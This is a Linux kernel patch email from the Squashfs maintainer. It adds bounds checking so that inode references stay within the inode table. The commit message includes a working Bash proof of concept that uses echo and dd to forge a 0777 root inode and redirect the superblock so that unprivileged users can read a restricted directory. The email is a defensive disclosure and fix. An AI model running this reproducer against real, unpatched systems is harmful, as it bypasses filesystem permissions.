Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.111
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1794029376;
	b=2t9TucT+4m5ImYeQahP7kq8SeaU0DKcFmW+cJr91CUP1g2wFe7c7xnJkU26iWYtYZV8O
	 To3hAhJDVak9Kdw5FPSt4eOdwkaWTinUf6zN1uw369lcz5NbCv+aHm5VIzm3519cJfkUX
	 PaxrWCkn8Cr8I9PWxyZXV4QT+zL1GrTUM9CNVoKejO/jAtPI0AluP8UcE8V8DXNsL25JV
	 aNKNOpH/+Cet0GUybuGr3pzMc43uEYmWq2GW4iTgJsfbKFMSzKQ0bzLi5OVMudfvR2miU
	 x0ZWXqbH9S5IbywKRXXMAv5K7ulcQyL+Aw9L/V6oY+k41rSdi6YK639W1CR+ngWLDoA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1794029376;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=tKHY5w0bvLa/aR9969VxnRVXjmiiemPUJVeETOmlrQ8=;
	b=fDhj/Q1soalifgRFN65OMaXUCBNQJOZ2sEvxzV2lf9j0Xo9f58AmgbvezfzGT/ft+K/G
	 dw9yxoJ82NMX/uv2aDqMaakVTlCUj6eCof8wdmEK9UKcKUsbgj4P3WRs3fGaDO/P3FsZ0
	 w8Fj1UJh/l2ykxoMm49ZFEqxXDg6z2Fw1tjjQB7Z8TN4EngKcsUokagiLRHz2HDMAQNSF
	 oAasG7SCeejVZ9Bo/z2VUVNKqHO3wdUgzwgAhooicL8xFKVMed9asAI+FIL2FeJYuG4PO
	 CrHM8UENwXd6ApOUNYrXoUQocb6pTmVnoz4CmzijghcVt+M06r7UqrrWHaWc/g93PiA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=ifkJB54y;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=S8EzUNpw;
	arc=none smtp.remote-ip=188.121.53.111
Received: from sxplsmtpa04-10.prod.sxb1.secureserver.net (sxplsmtpa04-10.prod.sxb1.secureserver.net [188.121.53.111])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 71A0A606A33A
	for <linux-kernel@vger.kernel.org>; Sat,  7 Nov 2026 05:29:35 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 71A0A606A33A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=ifkJB54y;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=S8EzUNpw
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id PYyzxFofBjLMrPYzRx4crq; Sat, 07 Nov 2026 05:29:21 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1794029362;
	bh=tKHY5w0bvLa/aR9969VxnRVXjmiiemPUJVeETOmlrQ8=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=ifkJB54yqFSYcAf/PnKkZ/Hlbtbnsewj1z9dxMbxVeJRtUbzrWwwvChLYYddMeeFX
	 pkHtk0eneuZ2Ctlbek0rv8osYJ4s0b9ivslOgOgIAGOV/M/dktZVj6jVPJ09f2HSH/
	 uumXgiAYjBszvzXe1fzFK896Q98XHGeLObwrNMhm0hy8bmsh1CCZnrLzkxQ2YHQQmB
	 gLveE5OstSi4WAASeY6sBXNmRLx6Mry/BQ1Cag0HoirYm5OOEziwezxSGG27zZ72A3
	 zpjBSaR/Zzi/+bCqcPhxwBSobVa6E7WLYxs28SZA7eVKJ7PNMG8j0gMTILf6mxUAxn
	 vMc8538ACNQIg==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1794029362;
	bh=tKHY5w0bvLa/aR9969VxnRVXjmiiemPUJVeETOmlrQ8=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=S8EzUNpwXpYultOyhoZQpFrKxGOAx/+prla8YIpMlkY1WkDr21AzeEhU5B6+cqN1P
	 JQ8OYvqoM6YUWlQcg8iStQ7qxn5FruEn/TTWPqVLcN2eQQ26zjHSCqoqmrmxHJUpL0
	 8BEytftE5DarugOweAdWkbLpexTPHZlnpL/iIUBFgGpPWjBXF6SSj5+VTqNNLKkjge
	 7rha91jPF3KPD7DPpaytlfrS/3/vodh1mU835l1MXO88w8O1u7SUhZn2KjoIis2xTo
	 5CuMLMK8UT+M2Gc6qToe9aSK8p1i9HlgKOli/H0GREJn0zQdy4NUBKXjj4yLVFsgIO
	 yFC34Owi7PzAg==
X-CMAE-Analysis: v=2.4 cv=fZ84WEQF c=1 sm=1 tr=0 ts=6aeeb732
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=WbH0joDL9KXNTEjrqjoA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: b1f91c23c774c9192d297a27ff196e48:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: akpm@linux-foundation.org,
	linux-kernel@vger.kernel.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH 09/18] Squashfs: sanity check inode metadata block location
Date: Sat,  7 Nov 2026 05:28:34 +0000
Message-ID: <20261107052843.725239-10-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261107052843.725239-1-phillip@squashfs.org.uk>
References: <20261107052843.725239-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfCQ87mJXdt25QGmEr4rL7PZ4Mq6NPhzTHRtEsIBjG5DZAf0/pRFkLDf74uVnv6nb+FUVFc1OoKComadNKuKwc1jUlJVjWRW+nsyBS0M2Pxzn1De2pAMf
 6OnrclXUKGM9bneR2plDvj9NknUdZnZ5zpnMvnq4wpvpa/3AuNMNcBm5MSgI7VjWFWPXH6YMl38hiiQvANlcTpKD8e6g6PmmSzT+zmD3f8pvi1XnhMQ4K8iI
 D6lZNDZPF/4djLwPC0L+8gpjsHr6ZkUfnTjpqF8JxvAt3lVGIHrVZd9tvCsDNMed

An inode reference in Squashfs is represented as a tuple, the location
of the compressed metadata block the inode is in, and the offset into
the uncompressed block.  The location is not absolute and it is instead
encoded as an offset from the start of the inode table.

An attacker could manipulate the inode reference to make it point to a
replacement malicious inode stored elsewhere, outside the inode table.
This is because the code does not check that the location is valid and
is within the inode table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to hide a malicious inode.

Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliberately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem root directory has
permissions 0700 (u=rxw), where only the superuser can enter the
directory and access the content within. But using this bug an attacker
could place a malicious root inode in the inode lookup table (used by
NFS) which has the permissions changed to 0777 (a=rwx), and then update
the root_inode field in the superblock to point to that.  On
reboot/remount this will make the directory accesisible to unprivileged
users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_inode_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the inode is within the inode table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the root directory
permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
is unchanged.

======================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
for i in $(seq 1 100); do
	echo "$i l zero" >> pseudo
done

# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# The root_inode field in the superblock points to the compressed metadata
# block and offset within it, where the root inode is stored.
#
# Create a malicious root inode and hide it in the inode lookup table.
# Because of mount time checking, there are no gaps between metadata tables
# where it can be hidden, and it can't be hidden after the file system end,
# because this is checked.

# Write malicious inode, this is the same as the original root inode, except
# it is uncompressed, and the permissions are set to 0777.
/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
\x00" > file

# Place new root inode inside the inode lookup table
echo Place new root inode inside the inode lookup table

dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new inode
# The start block is an offset from the inode_table_start, and not an
# absolute value.  The start of the inode table is 113, the new inode
# is placed at position 964, and so the offset is 851. Because we've only
# stored one inode in the metadata block, the offset into that block is 0.
#
echo Update the root_inode field in the superblock to point to our new inode

/usr/bin/echo -en "\x00\x00\x4f\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt, if the exploit is successful, permissions should be 0777
echo Stat /mnt, if the exploit is successful, permissions should be 0777

stat /mnt

popd 2>&1> /dev/null

rm -rf $DIR
======================================================================

Fixes: 6545b246a2c8 (" Squashfs: inode operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
 fs/squashfs/inode.c            | 13 ++++++-------
 fs/squashfs/squashfs_helpers.h | 18 ++++++++++++++++++
 2 files changed, 24 insertions(+), 7 deletions(-)

diff --git a/fs/squashfs/inode.c b/fs/squashfs/inode.c
index 73232582aca2..03e88c5b545a 100644
--- a/fs/squashfs/inode.c
+++ b/fs/squashfs/inode.c
@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
-	int offset = squashfs_inode_offset(ino);
+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
+	int offset = squashfs_inode_offset(ino), soffset = offset;
 	int err, type;
 	union squashfs_inode squashfs_ino;
 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
@@ -118,11 +118,13 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 
 	TRACE("Entered squashfs_read_inode\n");
 
+	if (block < 0)
+		goto failed_read;
 	/*
 	 * Read inode base common to all inode types.
 	 */
-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
-				&offset, sizeof(*sqshb_ino));
+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
+				&soffset, sizeof(*sqshb_ino));
 	if (err < 0)
 		goto failed_read;
 
@@ -130,9 +132,6 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 	if (err)
 		goto failed_read;
 
-	block = squashfs_inode_blk(ino) + msblk->inode_table;
-	offset = squashfs_inode_offset(ino);
-
 	type = le16_to_cpu(sqshb_ino->inode_type);
 	switch (type) {
 	case SQUASHFS_REG_TYPE: {
diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
index 524d4a77686d..662ebf464d3c 100644
--- a/fs/squashfs/squashfs_helpers.h
+++ b/fs/squashfs/squashfs_helpers.h
@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(s64 inode)
 	return inode & 0xffff;
 }
 
+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
+{
+	s64 start;
+
+	if (inode < 0)
+		return -EINVAL;
+
+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
+		return -EINVAL;
+
+	start = msblk->inode_table + squashfs_inode_blk(inode);
+
+	if (start >= msblk->directory_table)
+		return -EINVAL;
+
+	return start;
+}
+
 static inline s64 squashfs_mkinode(u32 start, u16 offset)
 {
 	return ((s64)start << 16) | offset;
-- 
2.47.3

